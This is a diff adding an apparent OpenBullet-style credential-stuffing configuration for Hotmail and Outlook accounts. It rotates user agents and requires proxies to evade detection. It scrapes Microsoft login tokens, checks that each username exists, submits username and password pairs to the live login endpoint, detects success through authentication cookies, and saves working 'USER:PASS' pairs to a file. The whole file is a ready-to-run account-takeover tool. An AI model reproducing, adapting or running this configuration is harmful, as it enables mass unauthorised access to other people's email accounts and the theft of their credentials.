@@ -1,0 +1,143 @@
+[SETTINGS]
+{
+  "Name": "Hotmail & Outlook",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-27T01:33:34.3981779+04:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+SET VAR "one" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
+SET VAR "two" "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18"
+SET VAR "three" "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0"
+SET VAR "four" "Opera/9.80 (Linux armv7l) Presto/2.12.407 Version/12.51 , D50u-D1-UHD/V1.5.16-UHD (Vizio, D50u-D1, Wireless)"
+SET VAR "five" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
+SET VAR "six" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0"
+SET VAR "seven" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
+SET VAR "UAList" "<one>|<two>|<three>|<four>|<five>|<six>|<seven>"
+
+#Split UTILITY Variable "UAList" Split "|" -> VAR "UA" 
+
+#MyRandomUA UTILITY List "UA" Random -> VAR "MyRandomUA" 
+
+#GET REQUEST GET "https://outlook.live.com/owa/?nlp=1" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "host: outlook.live.com" 
+  HEADER "connection: keep-alive" 
+  HEADER "referer: https://outlook.live.com/owa/" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: <MyRandomUA>" 
+
+#flowToken PARSE "<SOURCE>" LR "value=\"" "\"" -> VAR "flowToken" 
+
+#be PARSE "<SOURCE>" LR "be:'" "'" -> VAR "be" 
+
+#cZ PARSE "<SOURCE>" LR "cZ:'" "'" -> VAR "cZ" 
+
+#urlLogin PARSE "<SOURCE>" LR "urlLogin:'" "'" -> VAR "urlLogin" 
+
+#urlPost PARSE "<SOURCE>" LR "urlPost:'" "'" -> VAR "urlPost" 
+
+#uaid PARSE "<COOKIES(uaid)>" LR "" "" -> VAR "uaid" 
+
+#Length FUNCTION Length "{\"username\":\"<USER>\",\"uaid\":\"<uaid>\",\"isOtherIdpSupported\":false,\"checkPhones\":false,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":true,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":3,\"isSignup\":false,\"flowToken\":\"<flowToken>\"}" -> VAR "Length" 
+
+#PostEmail REQUEST POST "<be>" 
+  CONTENT "{\"username\":\"<USER>\",\"uaid\":\"<uaid>\",\"isOtherIdpSupported\":false,\"checkPhones\":false,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":false,\"isFidoSupported\":true,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":3,\"isSignup\":false,\"flowToken\":\"<flowToken>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "content-length: <Length>" 
+  HEADER "hpgact: 0" 
+  HEADER "hpgid: 33" 
+  HEADER "origin: https://login.live.com" 
+  HEADER "referer: <cZ>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: <MyRandomUA>" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "Display" 
+    KEY "IfExistsResult\":0" 
+    KEY "Username" 
+    KEY "Credentials" 
+    KEY "PrefCredential" 
+  KEYCHAIN Failure OR 
+    KEY "IfExistsResult\":1" 
+
+#RandomNum FUNCTION RandomNum "1000" "999999" -> VAR "Num" 
+
+#EncodeUSER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#EncodePASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Length FUNCTION Length "i13=1&login=<US>&loginfmt=<US>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PS>&KMSI=on&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<flowToken>&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=<Num>" -> VAR "Ln2" 
+
+#Login REQUEST POST "<urlPost>" 
+  CONTENT "i13=1&login=<US>&loginfmt=<US>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PS>&KMSI=on&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<flowToken>&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=<Num>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: <Ln2>" 
+  HEADER "origin: https://login.live.com" 
+  HEADER "referer: <urlLogin>" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: <MyRandomUA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "sErrTxt:'Your account or password is incorrect. If you don\\'t remember your password, <a id=\\\"idA_IL_ForgotPassword0\\\" href=\\\"\\\">reset it now." 
+    KEY "reset it now." 
+    KEY "sErrTxt" 
+    KEY "Sign in to your Microsoft account" 
+  KEYCHAIN Success AND 
+    KEY "<COOKIES(PPAuth)>" Exists 
+    KEY "<COOKIES(MSPAuth)>" Exists 
+    KEY "type=\"hidden\" name=\"t\" id=\"t\" value=\"" 
+
+#Save_as_Patch UTILITY File "Hotmail & Outlook Access.txt" AppendLines "<USER>:<PASS>" 
+  
